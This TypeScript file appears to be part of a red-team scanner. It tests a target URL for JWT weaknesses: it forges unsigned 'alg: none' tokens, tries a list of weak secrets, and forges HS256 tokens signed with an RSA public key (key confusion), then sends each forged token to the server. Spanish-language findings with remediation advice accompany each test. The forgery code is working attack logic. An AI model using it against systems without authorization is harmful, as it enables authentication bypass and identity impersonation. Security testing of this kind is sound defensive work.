import jwt from 'jsonwebtoken';
import type { JwtFinding } from '../../modules/redteam/redteam.types.js';

const COMMON_WEAK_SECRETS: readonly string[] = [
  'secret',
  '123456',
  'password',
  'jwt_secret',
  'app_secret',
  'supersecret',
  'admin',
  'key',
];

export class JwtScannerService {
  public async scanToken(targetUrl: string, token: string, publicKeyPem?: string): Promise<JwtFinding[]> {
    const findings: JwtFinding[] = [];

    const noneAlgFinding = await this.testAlgNone(targetUrl, token);
    if (noneAlgFinding) findings.push(noneAlgFinding);

    const weakSecretFinding = this.testWeakSecrets(token);
    if (weakSecretFinding) findings.push(weakSecretFinding);

    if (publicKeyPem) {
      const keyConfusionFinding = await this.testKeyConfusion(targetUrl, token, publicKeyPem);
      if (keyConfusionFinding) findings.push(keyConfusionFinding);
    }

    return findings;
  }

  private decodeParts(token: string): { header: Record<string, unknown>; payload: Record<string, unknown> } | null {
    try {
      const parts = token.split('.');
      if (parts.length < 2) return null;
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
      return { header, payload };
    } catch {
      return null;
    }
  }

  private async testAlgNone(targetUrl: string, originalToken: string): Promise<JwtFinding | null> {
    const decoded = this.decodeParts(originalToken);
    if (!decoded) return null;

    const modifiedHeader = { ...decoded.header, alg: 'none' };
    const unsignedToken = `${Buffer.from(JSON.stringify(modifiedHeader)).toString('base64url')}.${Buffer.from(
      JSON.stringify(decoded.payload)
    ).toString('base64url')}.`;

    const isValidAccepted = await this.sendTestRequest(targetUrl, unsignedToken);
    if (!isValidAccepted) return null;

    return {
      vulnerabilityType: 'ALG_NONE_ACCEPTED',
      severity: 'CRITICAL',
      description: 'El servidor aceptó un token JWT firmado con el algoritmo "none", permitiendo suplantación de identidad.',
      evidenceToken: unsignedToken,
      remediation: 'Desactivar explícitamente el soporte para el algoritmo "none" en la biblioteca de verificación JWT.',
    };
  }

  private testWeakSecrets(originalToken: string): JwtFinding | null {
    for (const secret of COMMON_WEAK_SECRETS) {
      try {
        jwt.verify(originalToken, secret);
        return {
          vulnerabilityType: 'WEAK_SECRET_BRUTEFORCED',
          severity: 'HIGH',
          description: `La firma del token JWT fue descifrada exitosamente usando el secreto débil: "${secret}".`,
          evidenceToken: originalToken,
          remediation: 'Utilizar una clave secreta HMAC de alta entropía (mínimo 256 bits aleatorios).',
        };
      } catch {
        // Continúa la búsqueda
      }
    }
    return null;
  }

  private async testKeyConfusion(
    targetUrl: string,
    originalToken: string,
    publicKeyPem: string
  ): Promise<JwtFinding | null> {
    const decoded = this.decodeParts(originalToken);
    if (!decoded) return null;

    try {
      const forgedHeader = { ...decoded.header, alg: 'HS256' };
      const forgedToken = jwt.sign(decoded.payload, publicKeyPem, {
        algorithm: 'HS256',
        header: forgedHeader,
      });

      const isAccepted = await this.sendTestRequest(targetUrl, forgedToken);
      if (!isAccepted) return null;

      return {
        vulnerabilityType: 'KEY_CONFUSION_RS256_TO_HS256',
        severity: 'CRITICAL',
        description: 'Vulnerabilidad Key Confusion: El servidor validó un token firmado con HS256 usando la clave pública como secreto.',
        evidenceToken: forgedToken,
        remediation: 'Restringir estrictamente los algoritmos permitidos en la verificación JWT (ej. solo RS256).',
      };
    } catch {
      return null;
    }
  }

  private async sendTestRequest(targetUrl: string, token: string): Promise<boolean> {
    try {
      const response = await fetch(targetUrl, {
        headers: { Authorization: `Bearer ${token}` },
      });
      return response.status >= 200 && response.status < 300;
    } catch {
      return false;
    }
  }
}